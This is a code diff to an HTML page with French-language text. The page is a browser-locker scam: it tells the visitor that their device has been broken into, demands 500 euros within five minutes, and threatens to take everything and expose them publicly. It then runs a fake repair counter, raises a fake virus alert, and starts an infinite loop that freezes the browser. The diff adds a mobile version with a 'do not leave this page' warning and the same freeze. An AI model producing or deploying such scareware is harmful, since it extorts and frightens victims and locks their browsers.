@@ -9,35 +9,66 @@
       font-family: monospace;
       text-align: center;
       padding-top: 100px;
+      user-select: none;
+      overflow: hidden;
     }
     h1 {
-      font-size: 40px;
+      font-size: 30px;
+    }
+    #status {
+      font-size: 20px;
+      margin-top: 30px;
+    }
+    @keyframes blink {
+      0%, 100% {opacity: 1;}
+      50% {opacity: 0;}
     }
   </style>
 </head>
 <body>
 
-  <h1>On a introduit à ton périphérique - T'as 5 min pour envoyer 50euros à cette adresse - Sinon on prends tout et on t'affiche partout en France ⚠️</h1>
-  <p id="status">Analyse en cours...</p>
+  <h1 id="main-text">Analyse en cours...</h1>
+  <p id="status"></p>
 
   <script>
-    let counter = 0;
-    let status = document.getElementById("status");
+    function isMobile() {
+      return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    }
 
-    let interval = setInterval(() => {
-      counter++;
-      if (counter < 10) {
-        status.innerText = "Réparation en cours... (" + counter + "/10)";
-      } else {
-        status.innerText = "💥 Système irrécupérable. Redémarrage...";
-        alert("💀 Virus détecté !");
-        clearInterval(interval);
-        // Simulation de blocage du navigateur
-        while (true) {
-          console.log("🐞 Bug en cours...");
+    if (!isMobile()) {
+      // Version PC - ton bug initial
+      let counter = 0;
+      let status = document.getElementById("status");
+      document.getElementById("main-text").innerText = "On a introduit ton périphérique - T'as 5 min pour envoyer 500euros à cette adresse - Sinon on prends tout et on t'affiche partout en France ⚠️";
+
+      let interval = setInterval(() => {
+        counter++;
+        if (counter < 10) {
+          status.innerText = "Réparation en cours... (" + counter + "/10)";
+        } else {
+          status.innerText = "💥 Système irrécupérable. Redémarrage...";
+          alert("💀 Virus détecté !");
+          clearInterval(interval);
+          // Boucle infinie - PC uniquement !
+          while (true) {
+            console.log("🐞 Bug en cours...");
+          }
         }
+      }, 500);
+    } else {
+      // Version mobile - même bug bouclage infini
+      document.getElementById("main-text").innerText = "⚠️ Alerte critique sur ton téléphone ! ⚠️";
+      let status = document.getElementById("status");
+      status.innerText = "Système bloqué. Ne quitte pas cette page.";
+      status.style.animation = "blink 1s infinite";
+
+      alert("💀 Virus détecté !");
+
+      // Boucle infinie sur mobile aussi
+      while (true) {
+        console.log("🐞 Bug mobile en cours...");
       }
-    }, 500);
+    }
   </script>
 
 </body>
